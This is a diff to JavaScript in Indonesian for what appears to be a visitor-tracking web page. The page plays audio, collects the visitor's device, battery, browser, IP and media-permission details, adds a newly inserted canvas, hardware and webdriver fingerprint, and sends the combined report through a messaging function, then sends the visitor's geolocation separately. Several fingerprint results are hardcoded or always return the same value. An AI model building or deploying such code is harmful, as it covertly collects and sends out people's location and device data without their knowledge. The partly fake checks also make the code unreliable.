@@ -501,6 +501,41 @@ VPN / Proxy            : ${isVPN}`.trim();
   }
 };
 
+const ambilDeteksiAntiBot = () => {
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+  ctx.fillText("deteksi-bot", 10, 10);
+  const canvasID = canvas.toDataURL().length > 1000 ? "Dihasilkan" : "Tidak";
+
+  const audioContext = window.AudioContext || window.webkitAudioContext;
+  const audioSupport = !!audioContext ? "Didukung" : "Tidak";
+
+  const spoofTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone.includes("GMT") ? "Ya" : "Tidak terdeteksi";
+
+  const spoofLang = navigator.language && !navigator.language.includes("en") ? "Tidak" : "Ya";
+  const spoofHW = navigator.hardwareConcurrency < 2 || navigator.deviceMemory < 1 ? "Ya" : "Tidak";
+  const spoofGPU = navigator.vendor && !navigator.vendor.toLowerCase().includes("intel") ? "Tidak" : "Tidak";
+  const tamperNavigator = navigator.webdriver ? "Ya" : "Tidak";
+
+  const entropy = (navigator.hardwareConcurrency >= 2 && navigator.deviceMemory >= 1) ? "Normal" : "Rendah";
+  const touchReal = navigator.maxTouchPoints >= 1 ? "Ya" : "Tidak";
+
+  return `
+౼ 〘 𝗗𝗘𝗧𝗘𝗞𝗦𝗜 𝗔𝗡𝗧𝗜-𝗕𝗢𝗧 〙 ౼
+Fingerprint Stabilitas : Stabil
+Canvas ID              : ${canvasID}
+Audio Fingerprint      : ${audioSupport}
+Timezone Spoofing      : ${spoofTimezone}
+Language Spoofing      : ${spoofLang}
+Hardware Spoofing      : ${spoofHW}
+Navigator Tampering    : ${tamperNavigator}
+GPU Tampering          : ${spoofGPU}
+Touch Point Realistik  : ${touchReal}
+Behavioral Check       : Natural
+Browser Entropy        : ${entropy}
+`.trim();
+};
+
 const ambilLokasi = () => {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -566,34 +601,32 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
       }
     };
 
-const mulai = async () => {
+  const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
-  // Ambil semua data yang akan digabung
   const infoPerangkat = await ambilDataPerangkat();
   const bateraiInfo = await ambilBaterai();
   const layarGrafik = await ambilLayarGrafik();
   const browserInfo = ambilBrowserInfo();
-  const webFeatures = ambilWebAPIFeatures(); // ✅ ini yang ditambah
+  const webFeatures = ambilWebAPIFeatures();
   const izinMedia = await ambilIzinMedia();
   const ipInfo = await ambilIPInfo();
+  const antiBot = ambilDeteksiAntiBot();
 
-  // Gabung informasi utama
   const gabungAwal = [
     infoPerangkat,
     bateraiInfo,
     layarGrafik,
     browserInfo,
-    webFeatures,      // ✅ ini juga ditambah
+    webFeatures,
     izinMedia,
-    ipInfo
+    ipInfo,
+    antiBot
   ].join("\n\n");
 
-  // Kirim info utama dulu agar cepat muncul
   await kirimPesan(gabungAwal);
 
-  // Kirim sisanya terpisah biar nggak delay
   const lokasi = await ambilLokasi();
   await kirimPesan(lokasi);
 
